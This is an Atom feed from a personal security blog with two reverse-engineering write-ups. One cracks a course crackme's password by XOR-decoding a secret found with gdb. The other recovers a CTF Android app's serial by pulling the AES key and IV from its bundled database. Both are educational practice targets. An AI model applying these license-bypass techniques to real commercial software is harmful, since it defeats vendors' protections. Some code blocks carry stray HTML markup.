<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Hacking | Mark Mossberg's Blog]]></title>
  <link href="http://blog.mark.lc/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="http://blog.mark.lc/"/>
  <updated>2014-12-11T23:43:57-05:00</updated>
  <id>http://blog.mark.lc/</id>
  <author>
    <name><![CDATA[Mark Mossberg]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Beginner Crackme]]></title>
    <link href="http://blog.mark.lc/blog/2014/10/27/crackme/"/>
    <updated>2014-10-27T00:00:00-04:00</updated>
    <id>http://blog.mark.lc/blog/2014/10/27/crackme</id>
    <content type="html"><![CDATA[<p>As part of an Intro to Security course I&rsquo;m taking, my professor gave us
a crackme style exercise to practice reading x86 assembly and basic
reverse engineering.</p>

<p>The program is pretty simple. It accepts a password as an argument and we&rsquo;re
told that if the password is correct, &ldquo;ok&rdquo; is printed.</p>

<pre><code>$ ./crackme
usage: ./crackme &lt;secret&gt;
$ ./crackme test
$
</code></pre>

<p>As usual, I start by running <code>file</code> on the binary, which shows that it&rsquo;s a
standard x64 ELF binary. <code>file</code> also says that the binary is &ldquo;not stripped&rdquo;, which means
that it includes symbols. All I really know about symbols are that they can
include debugging information about a binary like function and variable names
and some symbols aren&rsquo;t really necessary; they can be stripped out to reduce
the binary&rsquo;s size and make reverse engineering more challenging. Maybe I&rsquo;ll
do a more in depth post on this in the future.</p>

<pre><code>$ file crackme
crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x3fcf895b7865cb6be6b934640d1519a1e6bd6d39, not stripped
</code></pre>

<p>Next, I run <code>strings</code>, hoping to get lucky and find the password amongst the
strings in the binary. Strings looks for series of printable characters followed
by a NULL, but unfortunately nothing here works as the password.</p>

<pre><code>$ strings crackme
/lib64/ld-linux-x86-64.so.2
exd4
libc.so.6
puts
printf
memcmp
__libc_start_main
__gmon_start__
GLIBC_2.2.5
fffff.
AWAVA
AUATL
[]A\A]A^A_
usage: %s &lt;secret&gt;
;*3$"
</code></pre>

<p>Since that didn&rsquo;t work, we&rsquo;re forced to disassemble the binary and
actually try to reverse engineer it.
We&rsquo;ll start with <code>main</code>.</p>

<pre><code class="asm">$ gdb -batch -ex 'file crackme' -ex 'disas main'
Dump of assembler code for function main:
   0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
   0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
   0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
End of assembler dump.
</code></pre>

<p>Let&rsquo;s break this down a little.</p>

<pre><code class="asm">    0x00000000004004a0 &lt;+0&gt;:     sub    rsp,0x8
    0x00000000004004a4 &lt;+4&gt;:     cmp    edi,0x1
    0x00000000004004a7 &lt;+7&gt;:     jle    0x4004c7 &lt;main+39&gt;
</code></pre>

<p>Starting at the beginning, we see the stack pointer decremented as part of
the function prologue. The prologue is a set of setup steps involving
saving the old frame&rsquo;s
base pointer on the stack, reassigning the base pointer to the current
stack pointer, then subtracting the stack pointer a certain amount to make room
on the stack
for local variables, etc. We don&rsquo;t see the former two steps because this is
the main function so it doesn&rsquo;t <em>really</em> have a function calling it, so saving/setting
the base pointer isn&rsquo;t necessary.</p>

<p>Then the <code>edi</code> register is
compared to 1 and if it is less than or equal, we jump to offset 39.</p>

<pre><code class="asm">   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
   0x00000000004004c7 &lt;+39&gt;:    mov    rsi,QWORD PTR [rsi]
   0x00000000004004ca &lt;+42&gt;:    mov    edi,0x4006d4
   0x00000000004004cf &lt;+47&gt;:    xor    eax,eax
   0x00000000004004d1 &lt;+49&gt;:    call   0x400460 &lt;printf@plt&gt;
   0x00000000004004d6 &lt;+54&gt;:    mov    eax,0x1
   0x00000000004004db &lt;+59&gt;:    jmp    0x4004c2 &lt;main+34&gt;
</code></pre>

<p>Here at offset 39, we print something then jump to offset 34 where we repair
the stack (undo the sub instruction from the prologue) and return (ending
execution).</p>

<p>This is likely how the program checks the arguments and prints the usage
message if no arguments are supplied (which would cause argc/edi to be 1).</p>

<p>However if we supply an argument, <code>edi</code> is 0x2 and we move past the <code>jle</code>
instruction.</p>

<pre><code class="asm">   0x00000000004004a9 &lt;+9&gt;:     mov    rdi,QWORD PTR [rsi+0x8]
   0x00000000004004ad &lt;+13&gt;:    call   0x4005e0 &lt;verify_secret&gt;
</code></pre>

<p>Here we can see the <code>verify_secret</code> function being called with a parameter
in <code>rdi</code>. This is most likely the argument we passed into the program. We can
confirm this with gdb (I&rsquo;m using it with <a href="http://ropshell.com/peda/">peda</a> here).</p>

<pre><code>gdb-peda$ tele $rsi
0000| 0x7fffffffeb48 --&gt; 0x7fffffffed6e ("/home/vagrant/crackme/crackme")
0008| 0x7fffffffeb50 --&gt; 0x7fffffffed8c --&gt; 0x4548530074736574 ('test')
0016| 0x7fffffffeb58 --&gt; 0x0
</code></pre>

<p>Indeed <code>rsi</code> points to the first element of <code>argv</code>, so incrementing that by 8 bytes
(because 64 bit) points to <code>argv[1]</code>, which is our input.</p>

<p>If we look after the <code>verify_secret</code> call we can see the program checks
if <code>eax</code> is 0 and if it is, jumps to offset 34, ending the program. However, if
<code>eax</code> is not zero, we&rsquo;ll hit a <code>puts</code> call before exiting, which will presumably
print out the &ldquo;ok&rdquo; message we want.</p>

<pre><code class="asm">   0x00000000004004b2 &lt;+18&gt;:    test   eax,eax
   0x00000000004004b4 &lt;+20&gt;:    je     0x4004c2 &lt;main+34&gt;
   0x00000000004004b6 &lt;+22&gt;:    mov    edi,0x4006e8
   0x00000000004004bb &lt;+27&gt;:    call   0x400450 &lt;puts@plt&gt;
   0x00000000004004c0 &lt;+32&gt;:    xor    eax,eax
   0x00000000004004c2 &lt;+34&gt;:    add    rsp,0x8
   0x00000000004004c6 &lt;+38&gt;:    ret
</code></pre>

<p>Now lets disassemble <code>verify_secret</code> to see how the input validation is performed,
and to see how we can make it return non-zero.</p>

<pre><code class="asm">Dump of assembler code for function verify_secret:
   0x00000000004005e0 &lt;+0&gt;:     sub    rsp,0x408
   0x00000000004005e7 &lt;+7&gt;:     movzx  eax,BYTE PTR [rdi]
   0x00000000004005ea &lt;+10&gt;:    mov    rcx,rsp
   0x00000000004005ed &lt;+13&gt;:    test   al,al
   0x00000000004005ef &lt;+15&gt;:    je     0x400622 &lt;verify_secret+66&gt;
   0x00000000004005f1 &lt;+17&gt;:    mov    rdx,rsp
   0x00000000004005f4 &lt;+20&gt;:    jmp    0x400604 &lt;verify_secret+36&gt;
   0x00000000004005f6 &lt;+22&gt;:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x0000000000400600 &lt;+32&gt;:    test   al,al
   0x0000000000400602 &lt;+34&gt;:    je     0x400622 &lt;verify_secret+66&gt;
   0x0000000000400604 &lt;+36&gt;:    xor    eax,0xfffffff7
   0x0000000000400607 &lt;+39&gt;:    lea    rsi,[rsp+0x400]
   0x000000000040060f &lt;+47&gt;:    add    rdx,0x1
   0x0000000000400613 &lt;+51&gt;:    mov    BYTE PTR [rdx-0x1],al
   0x0000000000400616 &lt;+54&gt;:    add    rdi,0x1
   0x000000000040061a &lt;+58&gt;:    movzx  eax,BYTE PTR [rdi]
   0x000000000040061d &lt;+61&gt;:    cmp    rdx,rsi
   0x0000000000400620 &lt;+64&gt;:    jb     0x400600 &lt;verify_secret+32&gt;
   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
   0x0000000000400634 &lt;+84&gt;:    test   eax,eax
   0x0000000000400636 &lt;+86&gt;:    sete   al
   0x0000000000400639 &lt;+89&gt;:    add    rsp,0x408
   0x0000000000400640 &lt;+96&gt;:    movzx  eax,al
   0x0000000000400643 &lt;+99&gt;:    ret
End of assembler dump.
</code></pre>

<p>I won&rsquo;t walk through this one in detail because understanding each line
isn&rsquo;t necessary to crack this. Let&rsquo;s skip to
the memcmp call. If memcmp returns 0, <code>eax</code> is set to 1 and the function
returns. This is exactly what we want. From the man page, <code>memcmp</code> takes three
parameters, two buffers to compare and their lengths, and returns 0 if the
buffers are identical.</p>

<pre><code class="asm">   0x0000000000400622 &lt;+66&gt;:    mov    edx,0x18
   0x0000000000400627 &lt;+71&gt;:    mov    esi,0x600a80
   0x000000000040062c &lt;+76&gt;:    mov    rdi,rcx
   0x000000000040062f &lt;+79&gt;:    call   0x400480 &lt;memcmp@plt&gt;
</code></pre>

<p>Here&rsquo;s the setup to the <code>memcmp</code> call. We can see the third parameter for length
is the immediate 0x18 meaning the buffers will be 24 bytes in length. If we
examine address 0x600a80, we find this 24 byte string:</p>

<pre><code>gdb-peda$ hexd 0x600a80 /2
0x00600a80 : 91 bf a4 85 85 c3 ba b9 9f a6 b6 b1 93 b9 83 8f   ................
0x00600a90 : ae b1 ae c1 bc 80 ca ca 00 00 00 00 00 00 00 00   ................
</code></pre>

<p>Since this is a direct address to some memory, we can be fairly certain that
we&rsquo;ve found some sort of secret value! Based on the <code>movzx eax,BYTE PTR [rdi]</code>
instruction (offset 7)
which moves a byte from the input string into eax, the <code>xor eax, 0xfffffff7</code>
instruction (offset 36), and
the <code>add rdi, 0x1</code> instruction (offset 54) which increments the char*
pointer to our input string, we can reasonably guess
that this function is xor&#8217;ing each character of our input with 0xf7 and writing
the result into a buffer which begins at <code>rsp</code> (also pointed to by <code>rcx</code>). Since
we now know the secret (<code>\x91\xbf\xa4\x85...</code>) and the xor key (<code>0xf7</code>) it&rsquo;s
pretty easy to extract the password we need by xor&#8217;ing each byte of the secret
with the xor key.</p>

<p>Here&rsquo;s a way to do this with python.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x91</span>\<span class="n">xbf</span>\<span class="n">xa4</span>\<span class="n">x85</span>\<span class="n">x85</span>\<span class="n">xc3</span>\<span class="n">xba</span>\<span class="n">xb9</span>\<span class="n">x9f</span>\<span class="n">xa6</span>\<span class="n">xb6</span>\<span class="n">xb1</span>\<span class="n">x93</span>\<span class="n">xb9</span>\<span class="n">x83</span>\<span class="n">x8f</span>\<span class="n">xae</span>\<span class="n">xb1</span>\<span class="n">xae</span>\<span class="n">xc1</span>\<span class="n">xbc</span>\<span class="n">x80</span>\<span class="n">xca</span>\<span class="n">xca</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
<span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
    <span class="n">ba</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xf7</span>
<span class="k">print</span> <span class="n">ba</span></code></pre></div></p>

<p>Which results in this:</p>

<pre><code>$ python crack.py
fHSrr4MNhQAFdNtxYFY6Kw==
$ ./crackme fHSrr4MNhQAFdNtxYFY6Kw==
ok
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SU-CTF 2014 - "Commerical Application!"]]></title>
    <link href="http://blog.mark.lc/blog/2014/09/27/suctf_re/"/>
    <updated>2014-09-27T00:00:00-04:00</updated>
    <id>http://blog.mark.lc/blog/2014/09/27/suctf_re</id>
    <content type="html"><![CDATA[<p>This weekend I decided to try playing <a href="https://ctftime.org/event/159">SU-CTF</a>.
I&rsquo;m pretty bad at CTF to be honest, so I was pretty thrilled to get
one of the 200 point challenges in the third (of five) difficulty tiers.</p>

<h2>&ldquo;Commerical Application!&rdquo;</h2>

<p>For this challenge, we&rsquo;re given an Android application and the hint:</p>

<blockquote><p>Flag is a serial number.</p></blockquote>

<p>I installed it on my phone, here&rsquo;s what it looks like:</p>

<p><img src="/images/apk1.png" alt="" />
<img src="/images/apk2.png" alt="" />
<img src="/images/apk3.png" alt="" />
<img src="/images/apk4.png" alt="" /></p>

<p>I can tap on &ldquo;Picture-01&rdquo; and sliding to the right reveals this picture, but
if I try to tap on &ldquo;Picture-02&rdquo; or &ldquo;Pictures-03&rdquo; the app says I need to
enter a registration key. If I tap on the gear in the top right, I&rsquo;m
prompted to enter my product key.</p>

<p>Running <code>file</code> reveals that <code>.apk</code> files are apparently just Zip archives,
so let&rsquo;s try simply <code>unzip</code>&lsquo;ing it.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file suCTF.apk
suCTF.apk: Zip archive data, at least v2.0 to extract
<span class="nv">$ </span>unzip suCTF.apk
Archive:  suCTF.apk
  inflating: assets/db.db
  inflating: res/color/abs&lt;strong&gt;primary_text_disable_only_holo_dark.xml
  inflating: res/color/abs&lt;/strong&gt;primary_text_disable_only_holo_light.xml
  <span class="p">&amp;</span>hellip<span class="p">;</span>
  inflating: classes.dex
  inflating: META-INF/MANIFEST.MF
  inflating: META-INF/CERT.SF
  inflating: META-INF/CERT.RSA</code></pre></div></p>

<p>Cool! Now we have all the miscellaneous files that comprise the app. There&rsquo;s
a database file, various <code>.xml</code> design files, and most interestingly, a
<code>classes.dex</code> file. <code>.dex</code> files contain bytecode run on the Android Dalvik VM, which
is currently the Java runtime for Android devices, so <code>classes.dex</code> likely
contains the code that runs the app, in compiled form. We can use the nifty
<code>d2j-dex2jar</code> utility for decompiling it into a <code>classes-dex2jar.jar</code> file. <code>.jar</code>
files are apparently also Zip archives, and we can again <code>unzip</code> it to extract
its contents.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file classes.dex
classes.dex: Dalvik dex file version 035
<span class="nv">$ </span>d2j-dex2jar classes.dex
dex2jar classes.dex -&gt; classes-dex2jar.jar
<span class="nv">$ </span>unzip classes-dex2jar.jar
  <span class="p">&amp;</span>hellip<span class="p">;</span>
  inflating: edu/sharif/ctf/BuildConfig.class
  inflating: edu/sharif/ctf/CTFApplication.class
  inflating: edu/sharif/ctf/R<span class="nv">$attr</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$bool</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$color</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$dimen</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$drawable</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$id</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$integer</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$layout</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$menu</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$string</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$style</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$styleable</span>.class
  inflating: edu/sharif/ctf/R.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$4</span>.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$5</span>.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$6</span>.class
  inflating: edu/sharif/ctf/config/AppConfig.class
  inflating: edu/sharif/ctf/db/DBHelper.class
  inflating: edu/sharif/ctf/fragments/DListFragment<span class="nv">$1</span>.class
  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$1</span>.class
  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$OnPictureSelectedListener</span>.class
  inflating: edu/sharif/ctf/security/KeyVerifier.class
  <span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>

<p>This produces a TON of various <code>.class</code> files, but the most interesting lie
in the <code>edu/sharif/ctf/</code> directory and are the compiled versions of the actual
code that makes up this app. We can use the <code>jad</code> tool to decompile these back
into Java source and start trying to reverse the product key.</p>

<p>There&rsquo;s a directory in the app source called <code>security/</code> and contains a file
called <code>KeyVerifier.class</code> that seems pretty promising. After decompiling it,
we find a <code>KeyVerifier</code> class with some pretty cool functions.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isValidLicenceKey</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">flag</span><span class="o">;</span>
    <span class="k">if</span><span class="o">(</span><span class="n">encrypt</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">s1</span><span class="o">,</span> <span class="n">s2</span><span class="o">).</span><span class="na">equals</span><span class="o">(&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="mi">29</span><span class="n">a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;))</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="k">else</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="k">return</span> <span class="n">flag</span><span class="o">;</span>
<span class="o">}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="n">String</span> <span class="n">s3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;&amp;</span><span class="n">rdquo</span><span class="o">;;</span>
    <span class="n">String</span> <span class="n">s4</span><span class="o">;</span>
    <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">AES</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">AES</span><span class="o">/</span><span class="n">CBC</span><span class="o">/</span><span class="n">PKCS5Padding</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
    <span class="n">s4</span> <span class="o">=</span> <span class="n">bytesToHexString</span><span class="o">(</span><span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
    <span class="n">s3</span> <span class="o">=</span> <span class="n">s4</span><span class="o">;</span>
<span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="nl">L2:</span>
    <span class="k">return</span> <span class="n">s3</span><span class="o">;</span>
    <span class="n">Exception</span> <span class="n">exception</span><span class="o">;</span>
    <span class="n">exception</span><span class="o">;</span>
    <span class="n">exception</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="k">if</span><span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="k">goto</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">L2</span><span class="o">;</span> <span class="k">else</span> <span class="k">goto</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">L1</span>
<span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="nl">L1:</span>
<span class="o">}</span></code></pre></div></p>

<p>It&rsquo;s pretty clear that <code>isValidLicenceKey()</code> is what processes the product key
prompt in the app. The <code>encrypt()</code> function shows us that the first paramter
<code>s</code> is the cleartext to be encrypted, the second parameter <code>s1</code> is the AES
encryption key, and the last parameter <code>s2</code> is the AES
<a href="http://en.wikipedia.org/wiki/Initialization_vector">initialization vector</a>.
After doing a bit of grepping, I confirmed this by decompiling
<code>activities/MainActivity.class</code> and finding this code snippet:</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="n">DialogInterface</span> <span class="n">dialoginterface</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">)</span>
<span class="o">{</span>
    <span class="k">if</span><span class="o">(</span><span class="n">KeyVerifier</span><span class="o">.</span><span class="na">isValidLicenceKey</span><span class="o">(</span><span class="n">userInput</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityKey</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityIv</span><span class="o">()))</span>
    <span class="o">{</span>
        <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">updateLicence</span><span class="o">(</span><span class="mi">2014</span><span class="o">);</span>
        <span class="n">MainActivity</span><span class="o">.</span><span class="na">isRegisterd</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">Thank</span> <span class="n">you</span><span class="o">,</span> <span class="n">Your</span> <span class="n">application</span> <span class="n">has</span> <span class="n">full</span> <span class="n">licence</span><span class="o">.</span> <span class="n">Enjoy</span> <span class="n">it</span><span class="o">&amp;</span><span class="n">hellip</span><span class="o">;!&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="o">}</span> <span class="k">else</span>
    <span class="o">{</span>
        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">Your</span> <span class="n">licence</span> <span class="n">key</span> <span class="n">is</span> <span class="n">incorrect</span><span class="o">&amp;</span><span class="n">hellip</span><span class="o">;!</span> <span class="n">Please</span> <span class="k">try</span> <span class="n">again</span> <span class="n">with</span> <span class="n">another</span><span class="o">.&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></div></p>

<p>With
this in mind, the code seems to AES encrypt the user input and check if it matches
a certain output. If we had the AES key and IV, we could decrypt the given
output and find the plaintext product key.</p>

<p>Tracing through the calls for the second and third parameters passed into
<code>isValidLicense()</code> I found that
the AES key and IV were stored in the <code>assets/db.db</code> SQLite database I noticed
earlier.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sqlite3 assets/db.db
 <span class="p">&amp;</span>hellip<span class="p">;</span>
 sqlite&gt; <span class="k">select</span> * from config<span class="p">;</span>
 a           b           c           d           e                 f                                 g           h               i&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt; <span class="m">1</span>           <span class="m">2</span>           <span class="m">2014</span>        <span class="m">0</span>           a5efdbd57b84ca36  37eaae0141f1a3adf8a1dee655853714  <span class="m">1000</span>        ctf.sharif.edu  9</code></pre></div></p>

<p>There are no headers to the columns, but it is pretty obvious that the key
is the longer and the IV is the shorter of the &ldquo;interesting strings&rdquo; in the
database. For further confidence, I can verify this from the decompiled code
in <code>db/DBHelper.class</code>.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">AppConfig</span> <span class="nf">getConfig</span><span class="o">()</span>
<span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="n">AppConfig</span> <span class="n">appconfig</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">AppConfig</span><span class="o">();</span>
    <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">myDataBase</span><span class="o">.</span><span class="na">rawQuery</span><span class="o">(</span><span class="n">SELECT_QUERY</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">())</span>
    <span class="o">{</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">flag</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setInstallDate</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">2</span><span class="o">));</span>
        <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">3</span><span class="o">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="o">;=</span> <span class="mi">0</span><span class="o">)</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setValidLicence</span><span class="o">(</span><span class="n">flag</span><span class="o">);</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityIv</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">4</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityKey</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">5</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setDesc</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">7</span><span class="o">));</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">appconfig</span><span class="o">;</span>
<span class="o">}</span></code></pre></div></p>

<p>Using the key, IV and expected encrypted output, I wrote a simple decryption
program.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">blah</span> <span class="o">{</span>
    <span class="c1">// omitted for brevity</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesToHexString</span><span class="o">(</span><span class="kt">byte</span> <span class="n">abyte0</span><span class="o">[])</span> <span class="o">{</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="o">;</span> <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">hexStringToBytes</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="o">;</span> <span class="o">}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

